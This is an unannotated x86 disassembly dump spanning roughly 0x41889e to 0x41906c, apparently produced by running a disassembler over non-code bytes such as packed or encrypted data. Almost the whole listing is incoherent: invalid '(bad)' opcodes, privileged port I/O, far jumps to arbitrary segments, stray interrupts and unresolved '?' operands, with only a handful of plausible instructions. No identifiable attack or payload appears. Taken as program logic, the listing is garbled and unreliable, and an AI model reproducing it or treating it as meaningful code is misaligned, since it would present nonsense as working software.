  41889e:	(bad)  
  41889f:	fwait
  4188a0:	mov    ds:0x14e6a7c4,eax
  4188a5:	and    DWORD PTR [si+0x348f],esi
  4188aa:	fwait
  4188ab:	mov    BYTE PTR [edi+0x61558e4],cl
  4188b1:	pop    ebx
  4188b2:	sub    al,0xe4
  4188b4:	mov    ebp,0x331ceeaa
  4188b9:	imul   ebx,DWORD PTR [edi-0x39],0xfffffffb
  4188bd:	retf   0x4529
  4188c0:	bound  ebx,QWORD PTR [edx]
  4188c2:	push   edi
  4188c3:	xor    al,0x72
  4188c5:	adc    eax,0x7e4dff0c
  4188ca:	cmp    eax,esp
  4188cc:	scas   eax,DWORD PTR es:[edi]
  4188cd:	arpl   WORD PTR [edx],bp
  4188cf:	dec    ebp
  4188d0:	sbb    al,0xfd
  4188d2:	ds pop edi
  4188d4:	mov    ebp,0xf4e65879
  4188d9:	mov    eax,ds:0x4a71307
  4188de:	ss scas eax,DWORD PTR es:[edi]
  4188e0:	stos   DWORD PTR es:[edi],eax
  4188e1:	repnz adc eax,DWORD PTR [esi-0x42]
  4188e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188e6:	push   eax
  4188e7:	push   0xffffffb6
  4188e9:	fbld   TBYTE PTR [ebx+0x1478e79c]
  4188ef:	iret   
  4188f0:	(bad)
  4188f3:	fst    st(7)
  4188f5:	jecxz  0x4188d6
  4188f7:	mov    eax,ds:0x37f45021
  4188fc:	mov    ds:0xb1bc64cb,al
  418901:	jmp    0xaef6df9d
  418906:	gs clc 
  418908:	pop    ecx
  418909:	enter  0x4d2d,0xbd
  41890d:	cmp    BYTE PTR [esi+0x1cc9aa85],bl
  418913:	push   0x71a38da6
  418918:	pushf  
  418919:	xor    ebp,DWORD PTR [esi]
  41891b:	ret    
  41891c:	mov    edi,0xfec27114
  418921:	push   edi
  418922:	test   al,0xcf
  418924:	and    DWORD PTR [esi+0x75],ebx
  418927:	imul   edx,esi,0xd6cb770a
  41892d:	fisub  WORD PTR [ebp+edx*1-0x57]
  418931:	ss cmc 
  418933:	mov    ch,0xa5
  418935:	inc    edx
  418936:	xor    dh,BYTE PTR [edx]
  418938:	add    BYTE PTR [eax-0x43b58187],bh
  41893e:	mov    ds:0x49a0de15,eax
  418943:	mov    dl,0x8c
  418945:	push   ebp
  418946:	adc    DWORD PTR [edi],0xa13c4f9c
  41894c:	gs push ebp
  41894e:	out    dx,eax
  41894f:	fild   DWORD PTR [edx-0x51985565]
  418955:	imul   edx,DWORD PTR [eax],0xffffffba
  418958:	ins    BYTE PTR es:[edi],dx
  418959:	aas    
  41895a:	aaa    
  41895b:	shl    DWORD PTR [edx-0x46],0xff
  41895f:	aam    0x4b
  418961:	jecxz  0x41897b
  418963:	push   es
  418964:	mov    DWORD PTR [ecx],ebp
  418966:	jb     0x41895e
  418968:	adc    eax,DWORD PTR [ebx+0x78d5a5fb]
  41896e:	pop    es
  41896f:	shl    BYTE PTR [edx-0x3b69e9cd],1
  418975:	mov    al,ds:0x59fb08b3
  41897a:	add    DWORD PTR [ecx+0x54403da2],ecx
  418980:	clc    
  418981:	or     edx,DWORD PTR [ecx-0x79]
  418984:	imul   DWORD PTR [ebp+0x23213413]
  41898a:	dec    ebp
  41898b:	pop    edx
  41898c:	sar    DWORD PTR [ecx+0x595dbe0b],1
  418992:	dec    ecx
  418993:	enter  0x93b8,0xd1
  418997:	outs   dx,DWORD PTR ds:[esi]
  418998:	std    
  418999:	and    ebp,ebp
  41899b:	test   al,0x75
  41899d:	pop    edx
  41899e:	js     0x418928
  4189a0:	shl    BYTE PTR [edi-0x768d35d8],0xbc
  4189a7:	add    BYTE PTR [ebx+0x3a],dh
  4189aa:	(bad)  
  4189ac:	jp     0x418972
  4189ae:	test   ch,bh
  4189b0:	ror    BYTE PTR [esi*4-0x7fc5a39e],0x6f
  4189b8:	or     al,0x46
  4189ba:	(bad)  
  4189bb:	dec    esp
  4189bc:	lods   eax,DWORD PTR ds:[esi]
  4189bd:	ja     0x41897f
  4189bf:	sub    BYTE PTR [edi+ecx*8],al
  4189c2:	ret    
  4189c3:	lea    edx,[ebp-0x4a]
  4189c6:	loopne 0x418984
  4189c8:	dec    edi
  4189c9:	loopne 0x418990
  4189cb:	sub    eax,0x451651e3
  4189d0:	cmp    eax,0xcdc196aa
  4189d5:	ins    BYTE PTR es:[edi],dx
  4189d6:	(bad)  
  4189d7:	in     al,dx
  4189d8:	jae    0x418971
  4189da:	mov    edx,0xfa67aa6a
  4189df:	xor    al,0xa2
  4189e1:	ja     0x4189c1
  4189e3:	jb     0x418977
  4189e5:	outs   dx,DWORD PTR ds:[esi]
  4189e6:	inc    edi
  4189e7:	js     0x41898a
  4189e9:	pmaddwd mm3,mm0
  4189ec:	cmp    BYTE PTR [ebp+0x419cfadc],cl
  4189f2:	xchg   BYTE PTR [esi],dh
  4189f4:	fdivr  QWORD PTR [esi]
  4189f6:	add    esi,DWORD PTR [ebx+0x426f29b3]
  4189fc:	jge    0x418a4d
  4189fe:	mov    cl,bl
  418a00:	out    0x1b,eax
  418a02:	jo     0x418a82
  418a04:	movaps xmm3,xmm2
  418a07:	sbb    esi,DWORD PTR [esi+0x3a]
  418a0a:	cmp    BYTE PTR [edx+edx*2-0x57caa30a],al
  418a11:	pop    ebp
  418a12:	or     dl,bh
  418a14:	pop    es
  418a15:	rcr    esi,0x58
  418a18:	ret    
  418a19:	xchg   esi,eax
  418a1a:	lods   eax,DWORD PTR ds:[esi]
  418a1b:	push   0x13
  418a1d:	push   ds
  418a1e:	mov    edi,eax
  418a20:	mov    eax,DWORD PTR [ebp+0xc]
  418a23:	xor    eax,ecx
  418a25:	mov    ecx,DWORD PTR [ebp-0x8]
  418a28:	add    eax,edx
  418a2a:	imul   eax,ecx
  418a2d:	jmp    0x41adec
  418a32:	clc    
  418a33:	loope  0x4189be
  418a35:	mov    ah,0x87
  418a37:	test   bl,al
  418a39:	mov    ebp,0x3e8f68ea
  418a3e:	dec    edi
  418a3f:	mov    al,ds:0x1f390dee
  418a44:	popa   
  418a45:	(bad)  
  418a46:	rcr    BYTE PTR [edi+0x62],0x62
  418a4a:	(bad)  
  418a4b:	mov    DWORD PTR [edi+ecx*4+0x1e701191],eax
  418a52:	in     eax,dx
  418a53:	stc    
  418a54:	fcmove st,st(4)
  418a56:	call   0xdaa8:0x2396cbd6
  418a5d:	mov    ecx,0x63d54ce3
  418a62:	pop    ss
  418a63:	rol    edi,cl
  418a65:	xlat   BYTE PTR ds:[ebx]
  418a66:	jl     0x418a9a
  418a68:	pop    edx
  418a69:	jae    0x418a22
  418a6b:	jecxz  0x418ae4
  418a6d:	pop    edi
  418a6e:	es jne 0x418ae0
  418a71:	and    DWORD PTR [ebp+0x7f9a8644],0x2af2ec26
  418a7b:	mov    eax,ds:0x7541a221
  418a80:	add    BYTE PTR [ebx+ebp*8],0x32
  418a84:	pushf  
  418a85:	icebp  
  418a86:	stc    
  418a87:	xchg   ebx,eax
  418a88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a89:	cmp    edi,esi
  418a8b:	push   ebp
  418a8c:	(bad)  
  418a8d:	(bad)  
  418a8f:	pcmpeqb mm3,mm4
  418a92:	and    ah,BYTE PTR [esi]
  418a94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a95:	cmc    
  418a96:	pop    edi
  418a97:	mov    esi,ebx
  418a99:	mov    ah,0x7f
  418a9b:	out    0xe5,eax
  418a9d:	push   edx
  418a9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a9f:	out    dx,eax
  418aa0:	cmp    BYTE PTR ds:0x18df6f4d,0xc6
  418aa7:	outs   dx,BYTE PTR ds:[esi]
  418aa8:	fsub   QWORD PTR [esi]
  418aaa:	gs xchg dl,ah
  418aad:	fmul   QWORD PTR [ebx-0x1a23de2c]
  418ab3:	das    
  418ab4:	fisttp DWORD PTR [ebx-0x6f1b120f]
  418aba:	sbb    ebp,ebp
  418abc:	cmp    ebx,DWORD PTR [eax]
  418abe:	adc    BYTE PTR fs:[edx-0x360f0d74],0xc8
  418ac6:	or     ah,cl
  418ac8:	arpl   WORD PTR [ecx-0x285b8785],sp
  418ace:	jnp    0x418a78
  418ad0:	ins    DWORD PTR es:[edi],dx
  418ad1:	add    eax,0xa85f715e
  418ad6:	cli    
  418ad7:	jecxz  0x418a70
  418ad9:	mov    al,ds:0xcc0fb4ea
  418ade:	ret    0x4322
  418ae1:	or     eax,DWORD PTR [ecx+0x6038ff5e]
  418ae7:	inc    esi
  418ae8:	aam    0xaa
  418aea:	push   0x256020be
  418aef:	int3   
  418af0:	retf   
  418af1:	pop    esp
  418af2:	dec    edx
  418af3:	in     al,0x72
  418af5:	push   ebp
  418af6:	iret   
  418af7:	xor    eax,0x201ba715
  418afc:	mov    bh,0x45
  418afe:	xor    al,0x7
  418b00:	or     BYTE PTR [edi],ch
  418b02:	cwde   
  418b03:	not    BYTE PTR [ebp+eax*4-0x60]
  418b07:	sub    esi,DWORD PTR [esi+0x738009fc]
  418b0d:	retf   0xfc02
  418b10:	mov    ah,0x85
  418b12:	je     0x418b10
  418b14:	stos   DWORD PTR es:[edi],eax
  418b15:	repz mov ebp,0x5974274b
  418b1b:	fld    QWORD PTR ss:[ecx-0x5b6247a7]
  418b22:	pop    ecx
  418b23:	dec    ebp
  418b24:	je     0x418af9
  418b26:	dec    esi
  418b27:	aas    
  418b28:	loopne 0x418b6f
  418b2a:	xchg   ecx,eax
  418b2b:	dec    esp
  418b2c:	sbb    DWORD PTR [ecx-0x177f4f01],0xb5c98e34
  418b36:	fld    TBYTE PTR [eax-0x7853333c]
  418b3c:	stos   DWORD PTR es:[edi],eax
  418b3d:	cli    
  418b3e:	xchg   edi,eax
  418b3f:	mov    dl,0x2f
  418b41:	jge    0x418b36
  418b43:	pop    ebx
  418b44:	mov    al,ds:0x64b86502
  418b49:	outs   dx,DWORD PTR ds:[esi]
  418b4a:	fcom   DWORD PTR [eax]
  418b4c:	loop   0x418b67
  418b4e:	(bad)  
  418b4f:	cmp    al,0xc0
  418b51:	jns    0x418b0b
  418b53:	iret   
  418b54:	sti    
  418b55:	add    edx,DWORD PTR [edx+edi*2]
  418b58:	imul   edi,DWORD PTR [edi],0xada6baea
  418b5e:	xchg   ecx,eax
  418b5f:	or     dl,ah
  418b61:	sbb    ebp,ecx
  418b63:	out    dx,al
  418b64:	adc    al,0x6f
  418b66:	pop    edx
  418b67:	aam    0xbc
  418b69:	dec    eax
  418b6a:	cmc    
  418b6b:	sahf   
  418b6c:	arpl   WORD PTR [edi-0x4e],di
  418b6f:	stos   BYTE PTR es:[edi],al
  418b70:	in     eax,0x45
  418b72:	jbe    0x418b85
  418b74:	addr16 jmp 0x418b30
  418b77:	adc    DWORD PTR [eax+0x1ddbf9a9],ebp
  418b7d:	push   ss
  418b7e:	mov    BYTE PTR [esp+ebx*2+0x26933164],bh
  418b85:	outs   dx,BYTE PTR ds:[esi]
  418b86:	fidivr WORD PTR [esi+0x55]
  418b89:	das    
  418b8a:	mov    esi,0x5fe6e23d
  418b8f:	loopne 0x418bc7
  418b91:	pop    edi
  418b92:	dec    al
  418b94:	mov    bl,ah
  418b96:	jge    0x418b79
  418b98:	fsub   QWORD PTR [ebx+0x2bd91e91]
  418b9e:	mov    edx,DWORD PTR [edx-0x49d65587]
  418ba4:	sbb    al,0x3f
  418ba6:	cdq    
  418ba7:	pop    fs
  418ba9:	jecxz  0x418b4c
  418bab:	add    eax,0x3885c251
  418bb0:	sbb    eax,0x93a296d7
  418bb5:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  418bb7:	cdq    
  418bb8:	iret   
  418bb9:	lods   eax,DWORD PTR ds:[esi]
  418bba:	xor    esp,0xd7c1a11d
  418bc0:	pop    eax
  418bc1:	out    dx,eax
  418bc2:	mov    ebp,0x8beaaeca
  418bc7:	mov    dh,0xb5
  418bc9:	pop    esp
  418bca:	cmp    eax,0x828d83b1
  418bcf:	jle    0x418bc9
  418bd1:	mov    ecx,ebp
  418bd3:	pop    esp
  418bd4:	jecxz  0x418bde
  418bd6:	icebp  
  418bd7:	rcl    ah,cl
  418bd9:	sbb    ecx,DWORD PTR [ecx-0x56]
  418bdc:	ja     0x418bd7
  418bde:	add    DWORD PTR [eax-0x5],ecx
  418be1:	pop    esp
  418be2:	or     DWORD PTR [esi+0x62],esp
  418be5:	mov    eax,0x1d3f5d49
  418bea:	jns    0x418bc2
  418bec:	mov    eax,ds:0x8a43f86b
  418bf1:	jg     0x418bf4
  418bf3:	mov    bl,BYTE PTR [edi+0x40]
  418bf6:	daa    
  418bf7:	or     BYTE PTR [ebx],bh
  418bf9:	xchg   ebp,eax
  418bfa:	mov    esi,0x9ea93f6d
  418bff:	sub    eax,0x4a175610
  418c04:	pop    ebp
  418c05:	repnz xor eax,0x3ec0df6e
  418c0b:	mov    ds:0xd346f39d,al
  418c10:	in     al,0x4d
  418c12:	xchg   ebp,eax
  418c13:	cmp    al,0xd1
  418c15:	ja     0x418c26
  418c17:	jne    0x418c94
  418c19:	mov    edi,0x799993fc
  418c1e:	out    dx,al
  418c1f:	lahf   
  418c20:	pop    ecx
  418c21:	mov    bl,0x60
  418c23:	mov    bh,BYTE PTR [ebp+ebx*1-0x65]
  418c27:	xchg   ebx,eax
  418c28:	add    al,BYTE PTR [esi-0x155b1677]
  418c2e:	clc    
  418c2f:	pop    esp
  418c30:	out    0x8c,eax
  418c32:	cmp    al,0x6
  418c34:	and    DWORD PTR [eax+0x370c5a64],esp
  418c3a:	sahf   
  418c3b:	out    0x5e,al
  418c3d:	sub    al,0x78
  418c3f:	retf   
  418c40:	mov    ebx,0x1fda4c3c
  418c45:	lea    ebp,[esi+esi*2-0x4baff5bd]
  418c4c:	xchg   ebp,eax
  418c4d:	retf   
  418c4e:	lods   eax,DWORD PTR ds:[esi]
  418c4f:	cwde   
  418c50:	outs   dx,BYTE PTR ds:[esi]
  418c51:	sbb    al,0xb7
  418c53:	loop   0x418c1a
  418c55:	push   eax
  418c56:	movd   mm0,DWORD PTR [eax-0x1f]
  418c5a:	stos   DWORD PTR es:[edi],eax
  418c5b:	push   ebp
  418c5c:	scas   eax,DWORD PTR es:[edi]
  418c5d:	xchg   esi,eax
  418c5e:	mov    dh,0x26
  418c60:	jecxz  0x418cd5
  418c62:	push   es
  418c63:	cli    
  418c64:	sub    dh,dl
  418c66:	scas   eax,DWORD PTR es:[edi]
  418c67:	sub    DWORD PTR ds:0x88181f6d,esi
  418c6d:	lea    esi,[eax]
  418c6f:	mov    DWORD PTR [eax-0x4cf40552],0xc272a93b
  418c79:	test   eax,0xa685d7b0
  418c7e:	icebp  
  418c7f:	sub    al,0x21
  418c81:	hlt    
  418c82:	das    
  418c83:	mov    edi,0x1b32846d
  418c88:	imul   eax,eax,0xffffffd2
  418c8b:	ret    0x4ce8
  418c8e:	int    0x36
  418c90:	push   edi
  418c91:	dec    edi
  418c92:	fbstp  TBYTE PTR [edx+0x34]
  418c95:	jbe    0x418cbb
  418c97:	or     cl,BYTE PTR [ebx-0x43]
  418c9a:	push   esp
  418c9b:	enter  0xa2c7,0x71
  418c9f:	xor    dl,BYTE PTR [eax-0x4853466f]
  418ca5:	add    DWORD PTR [ecx],ebx
  418ca7:	fild   QWORD PTR [ecx+0x470ca7f7]
  418cad:	and    bl,BYTE PTR [ecx-0x41]
  418cb0:	push   ecx
  418cb1:	test   eax,0x97403ab
  418cb6:	fs aaa 
  418cb8:	jnp    0x418cab
  418cba:	mov    eax,ebx
  418cbc:	jb     0x418cc0
  418cbe:	and    al,0x4c
  418cc0:	and    dh,0xd2
  418cc3:	pusha  
  418cc4:	push   cs
  418cc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cc6:	jns    0x418d3c
  418cc8:	or     ebp,eax
  418cca:	push   esp
  418ccb:	mov    BYTE PTR [esi+0x64e1fce2],dh
  418cd1:	sub    ah,dh
  418cd3:	mov    esp,0x9849dba7
  418cd8:	outs   dx,BYTE PTR ds:[esi]
  418cd9:	or     BYTE PTR [ecx],al
  418cdb:	xchg   BYTE PTR [ebx+esi*2],al
  418cde:	ret    0xa1b0
  418ce1:	inc    edi
  418ce2:	ss es cmp al,0xf3
  418ce6:	jns    0x418d05
  418ce8:	cs inc eax
  418cea:	outs   dx,BYTE PTR ds:[esi]
  418ceb:	ret    
  418cec:	mov    ebp,ebp
  418cee:	lods   eax,DWORD PTR ds:[esi]
  418cef:	int    0x83
  418cf1:	mov    edx,0x972cc413
  418cf6:	cdq    
  418cf7:	jmp    DWORD PTR [ecx-0x791e6fa0]
  418cfd:	xor    DWORD PTR [esi+ebx*1],ebp
  418d00:	repz mov edi,0x9f19a0d4
  418d06:	sub    bl,BYTE PTR [edx-0x1188aa53]
  418d0c:	mov    edx,0x272bcc67
  418d11:	sbb    BYTE PTR [esi+0x27b842dd],bh
  418d17:	and    eax,0xef5877d1
  418d1c:	lahf   
  418d1d:	push   ss
  418d1e:	cmp    dl,BYTE PTR [ebx+0xf]
  418d21:	popf   
  418d22:	inc    edi
  418d23:	mov    ah,0x91
  418d25:	inc    edi
  418d26:	sbb    eax,DWORD PTR [esi-0x56]
  418d29:	das    
  418d2a:	sub    BYTE PTR [eax-0x47],dl
  418d2d:	xor    al,0x15
  418d2f:	fldenv [ebp+eax*4-0x6b]
  418d33:	add    BYTE PTR [eax+0x5f7d4735],dl
  418d39:	sbb    esp,DWORD PTR [eax+eax*8-0x47a32e6e]
  418d40:	xor    BYTE PTR [ecx-0x1f880818],al
  418d46:	in     al,dx
  418d47:	(bad)  
  418d48:	loopne 0x418d6d
  418d4a:	and    BYTE PTR [eax-0x48],bl
  418d4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d4e:	stc    
  418d4f:	scas   eax,DWORD PTR es:[edi]
  418d50:	push   ds
  418d51:	mov    ?,WORD PTR [edi+0x7c]
  418d54:	mov    al,ds:0x68a86264
  418d59:	ret    
  418d5a:	mov    cs,WORD PTR [eax]
  418d5c:	xor    BYTE PTR [ebp+0x702fa5e7],al
  418d62:	dec    ebx
  418d63:	jae    0x418d03
  418d65:	and    ebp,DWORD PTR ds:0x9c4d5b3c
  418d6b:	ins    DWORD PTR es:[edi],dx
  418d6c:	clc    
  418d6d:	mov    ah,0x96
  418d6f:	jg     0x418d7d
  418d71:	lds    esp,FWORD PTR [ebx]
  418d73:	sbb    ecx,DWORD PTR [edx+0x0]
  418d76:	adc    dh,BYTE PTR [eax]
  418d78:	cwde   
  418d79:	in     eax,dx
  418d7a:	sbb    bh,BYTE PTR [esi]
  418d7c:	popf   
  418d7d:	pxor   mm5,QWORD PTR [ebx]
  418d80:	dec    ebp
  418d81:	adc    bl,ch
  418d83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d84:	outs   dx,DWORD PTR ds:[esi]
  418d85:	stos   BYTE PTR es:[edi],al
  418d86:	jp     0x418db5
  418d88:	int    0xa9
  418d8a:	dec    ebp
  418d8b:	addr16 push ecx
  418d8d:	cmp    al,0x5c
  418d8f:	sub    al,0x53
  418d91:	imul   ecx,DWORD PTR [ebx],0x1f
  418d94:	cs aam 0x90
  418d97:	sub    dh,cl
  418d99:	jbe    0x418de0
  418d9b:	aaa    
  418d9c:	mov    eax,ds:0x5bb979e3
  418da1:	push   0xb96c9194
  418da6:	push   esi
  418da7:	inc    eax
  418da8:	(bad)  
  418da9:	jmp    0x418d42
  418dab:	repnz mov esi,0x18721c4e
  418db1:	xor    al,0xe6
  418db3:	push   esp
  418db4:	lock ins BYTE PTR es:[edi],dx
  418db6:	rol    DWORD PTR [ebx+0x63],1
  418db9:	xchg   ecx,eax
  418dba:	xor    edi,DWORD PTR [edx-0x22]
  418dbd:	cmp    ch,BYTE PTR [eax-0x4f]
  418dc0:	test   eax,0x15c613ae
  418dc5:	sahf   
  418dc6:	xchg   ecx,eax
  418dc7:	and    al,0x65
  418dc9:	popf   
  418dca:	xchg   esp,eax
  418dcb:	(bad)  
  418dcc:	cmp    BYTE PTR [ebx+edx*4],al
  418dcf:	lahf   
  418dd0:	mov    ah,0x0
  418dd2:	icebp  
  418dd3:	mov    ah,0xdc
  418dd5:	mov    ?,eax
  418dd7:	imul   esp,edi,0x1b
  418dda:	mov    bh,0x18
  418ddc:	cwde   
  418ddd:	mov    WORD PTR [ebx+0x3cd7e9fb],fs
  418de3:	sbb    edi,esi
  418de5:	call   0x59cf7d
  418dea:	xor    eax,0xba4eaffd
  418def:	lea    edx,[ecx]
  418df1:	loope  0x418dcf
  418df3:	aas    
  418df4:	dec    eax
  418df5:	adc    BYTE PTR [eax+edx*1-0x59],ch
  418df9:	(bad)  
  418dfa:	mov    edi,edx
  418dfc:	xor    al,0x72
  418dfe:	cmp    al,0xc1
  418e00:	out    dx,ax
  418e02:	repnz push eax
  418e04:	(bad)  
  418e05:	aaa    
  418e06:	xor    ah,BYTE PTR [eax]
  418e08:	jne    0x418daf
  418e0a:	repz test eax,0x961fb92f
  418e10:	(bad)  
  418e12:	xor    bl,BYTE PTR [ecx+0x74ba9091]
  418e18:	test   al,0xad
  418e1a:	mov    WORD PTR [ebx],ds
  418e1c:	push   edi
  418e1d:	or     bl,BYTE PTR [ecx]
  418e1f:	cmp    DWORD PTR [ecx],eax
  418e21:	in     eax,dx
  418e22:	clc    
  418e23:	sbb    edx,ebp
  418e25:	call   0xccd2:0xc0d2711a
  418e2c:	dec    esp
  418e2d:	imul   edx,DWORD PTR [esi+0x7a],0xba982924
  418e34:	arpl   WORD PTR [ebp+edx*4-0x5d],dx
  418e38:	pop    esi
  418e39:	pusha  
  418e3a:	imul   esi,DWORD PTR [ecx+0x412427eb],0x70
  418e41:	pusha  
  418e42:	jmp    0x7574:0xa6b6877e
  418e49:	out    dx,eax
  418e4a:	shr    BYTE PTR [ebp+0x2607660f],cl
  418e50:	xchg   DWORD PTR [ecx],ecx
  418e52:	sbb    eax,0xc5bcf941
  418e57:	cmp    DWORD PTR [ecx-0x6d1c4b52],esi
  418e5d:	in     al,0x56
  418e5f:	inc    edi
  418e60:	clc    
  418e61:	in     eax,0x17
  418e63:	pop    edx
  418e64:	or     bl,BYTE PTR [edx+edi*4+0x2ad804b2]
  418e6b:	lds    esi,FWORD PTR [edi+edx*1]
  418e6e:	or     eax,0x8360a24b
  418e73:	out    0x51,eax
  418e75:	push   es
  418e76:	adc    al,0x51
  418e78:	dec    esp
  418e79:	or     ebp,edx
  418e7b:	jge    0x418ebc
  418e7d:	add    BYTE PTR [ebp+0x55562d5f],cl
  418e83:	jp     0x418e50
  418e85:	xor    DWORD PTR [edi-0x2c],ebx
  418e88:	popf   
  418e89:	data16 cld 
  418e8b:	pop    esp
  418e8c:	ds push ebx
  418e8e:	popa   
  418e8f:	cmp    edx,DWORD PTR [edx+0x24]
  418e92:	push   esi
  418e93:	outs   dx,BYTE PTR ds:[esi]
  418e94:	icebp  
  418e95:	push   0xad5f4124
  418e9a:	das    
  418e9b:	cmp    eax,0x9f13c148
  418ea0:	pop    ds
  418ea1:	ret    0x608f
  418ea4:	imul   ebp,edx,0xb9777e0f
  418eaa:	mov    bh,0xdc
  418eac:	xor    al,0xc2
  418eae:	adc    edx,ebp
  418eb0:	je     0x418ed4
  418eb2:	fcmovbe st,st(1)
  418eb4:	pop    ss
  418eb5:	adc    eax,0x1043c911
  418eba:	mov    cl,0x5
  418ebc:	out    0xb3,al
  418ebe:	lock fldenv [ebx+ebx*4-0x2dc8fc8e]
  418ec6:	jg     0x418e5b
  418ec8:	cmp    ah,bh
  418eca:	lock (bad) 
  418ecc:	loope  0x418e8e
  418ece:	div    BYTE PTR [edx+0x13cfce7e]
  418ed4:	pop    edi
  418ed5:	dec    esp
  418ed6:	sbb    al,0x28
  418ed8:	sub    BYTE PTR [edx-0xe],ah
  418edb:	out    dx,al
  418edc:	mov    bh,0xe4
  418ede:	dec    ebp
  418edf:	ins    BYTE PTR es:[edi],dx
  418ee0:	cmc    
  418ee1:	jmp    FWORD PTR [edi-0x5be4cf2c]
  418ee7:	ss out 0x4d,eax
  418eea:	push   eax
  418eeb:	inc    edx
  418eec:	les    eax,FWORD PTR [ecx+eiz*8-0x278f85b2]
  418ef3:	mov    WORD PTR [edi-0x59],ss
  418ef6:	jb     0x418f25
  418ef8:	mov    al,0x29
  418efa:	dec    esi
  418efb:	dec    eax
  418efc:	mov    eax,ds:0x6d6e8d44
  418f01:	mov    al,ds:0xb52975a8
  418f06:	push   edx
  418f07:	in     eax,dx
  418f08:	cmp    dh,ah
  418f0a:	sbb    DWORD PTR [edi],ebx
  418f0c:	mov    bh,BYTE PTR [edi]
  418f0e:	repnz xor cl,bl
  418f11:	in     eax,0xe5
  418f13:	dec    ecx
  418f14:	push   ebp
  418f15:	(bad)  
  418f16:	in     al,dx
  418f17:	lahf   
  418f18:	push   0x4d
  418f1a:	mov    eax,ds:0xcdad8113
  418f1f:	pop    edx
  418f20:	adc    al,dh
  418f22:	imul   ecx,DWORD PTR [ecx+0x44],0xfffffff1
  418f26:	daa    
  418f27:	cwde   
  418f28:	call   0x9e4fb2d7
  418f2d:	and    bh,BYTE PTR [edx-0x9cdfff8]
  418f33:	xchg   ebx,eax
  418f34:	xchg   edx,eax
  418f35:	mov    eax,ebp
  418f37:	xor    dh,BYTE PTR [edi]
  418f39:	or     BYTE PTR [eax+0x75],bh
  418f3c:	sub    ah,BYTE PTR [ebx-0x286ca08c]
  418f42:	dec    esi
  418f43:	push   edx
  418f44:	mov    WORD PTR [ebx],?
  418f46:	mov    ecx,0xd48f8653
  418f4b:	jo     0x418fc8
  418f4d:	sbb    al,0x78
  418f4f:	test   al,0x5d
  418f51:	das    
  418f52:	sbb    al,0x49
  418f54:	xor    al,0xcf
  418f56:	cs mov bh,0x95
  418f59:	test   bh,0x40
  418f5c:	mov    ecx,0xaef086c0
  418f61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f63:	push   0xa968da63
  418f68:	push   edx
  418f69:	jp     0x418f48
  418f6b:	mov    ebp,0xaaa2aa95
  418f70:	push   edx
  418f71:	int3   
  418f72:	ret    0xaf48
  418f75:	sub    DWORD PTR [eax],0x24
  418f78:	or     eax,0xf929b597
  418f7d:	clc    
  418f7e:	sub    eax,0x755c500a
  418f83:	adc    cl,cl
  418f85:	and    al,0xad
  418f87:	mov    ds:0x5baa5344,eax
  418f8c:	inc    edi
  418f8d:	xor    DWORD PTR [edx],eax
  418f8f:	inc    edx
  418f90:	jg     0x418fa0
  418f92:	ja     0x418f89
  418f94:	mul    bl
  418f96:	out    0xcc,al
  418f98:	adc    DWORD PTR [eax+0x7aa1f900],edx
  418f9e:	push   ebp
  418f9f:	daa    
  418fa0:	sub    DWORD PTR [ecx+0x3],0xffffffd5
  418fa4:	mov    edx,0x6bb86e7e
  418fa9:	xchg   esp,eax
  418faa:	je     0x418f98
  418fac:	adc    eax,0x7b24097d
  418fb1:	xor    al,BYTE PTR [ecx+0x6584e62d]
  418fb7:	mov    WORD PTR [edx],ss
  418fb9:	cli    
  418fba:	(bad)  
  418fbb:	push   esp
  418fbc:	xor    eax,0xfc9dea0a
  418fc1:	fnstcw WORD PTR [ebp+edi*8+0x4c]
  418fc5:	test   BYTE PTR [eax+eax*4-0x61],bl
  418fc9:	adc    eax,0x7288fbc3
  418fce:	mov    bl,0xb4
  418fd0:	sub    BYTE PTR [edx+edi*1+0x74],dl
  418fd4:	xor    BYTE PTR [eax],bh
  418fd6:	mov    ebx,DWORD PTR [edi+ebp*8]
  418fd9:	mov    ds:0x87ea3b6a,eax
  418fde:	jno    0x418f85
  418fe0:	cmp    DWORD PTR [edx-0xbc8a56b],esp
  418fe6:	retf   0xbe98
  418fe9:	inc    ebx
  418fea:	adc    al,ch
  418fec:	jmp    0x646b:0xafaa08ab
  418ff3:	sub    eax,DWORD PTR [esi-0x27]
  418ff6:	fmulp  st(1),st
  418ff8:	xchg   esi,eax
  418ff9:	cmp    eax,0x6ca5a76a
  418ffe:	pop    ecx
  418fff:	rcl    DWORD PTR [edx],cl
  419001:	mov    ds:0x5c3f4936,al
  419006:	sar    edx,1
  419008:	mov    ds:0x146f3e5d,al
  41900d:	mov    ah,0xb3
  41900f:	bound  esi,QWORD PTR [eax]
  419011:	push   ds
  419012:	xchg   edx,eax
  419013:	ss loope 0x418ff7
  419016:	mov    dl,0x78
  419018:	(bad)  
  419019:	and    bl,cl
  41901b:	out    0xd2,al
  41901d:	pop    ds
  41901e:	leave  
  41901f:	hlt    
  419020:	mov    esi,ebp
  419022:	cmp    esp,DWORD PTR [edx-0x21]
  419025:	cdq    
  419026:	adc    edx,DWORD PTR [ebx]
  419028:	xchg   edx,eax
  419029:	arpl   WORD PTR ds:0xe0d7104e,sp
  41902f:	out    dx,al
  419030:	and    dl,BYTE PTR [ebp-0x20]
  419033:	xchg   edi,eax
  419034:	out    dx,eax
  419035:	mov    ds,WORD PTR [esi+0x549a9ac0]
  41903b:	xor    DWORD PTR [ebp+0x6fb05305],esp
  419041:	jo     0x41908f
  419043:	shl    BYTE PTR [edi+0x4cc0146f],0x1a
  41904a:	cmp    DWORD PTR [edi],0xf9fdebbc
  419050:	inc    ebp
  419051:	or     DWORD PTR [eax+edi*1-0x26a6d953],edx
  419058:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419059:	cmp    edi,DWORD PTR [esi+0x3b]
  41905c:	add    eax,0xc95290bf
  419061:	sub    cl,BYTE PTR [ebp+0x11]
  419064:	stc    
  419065:	jne    0x4190e1
  419067:	mov    eax,0x62a0af5c
  41906c:	and    al,0xa5
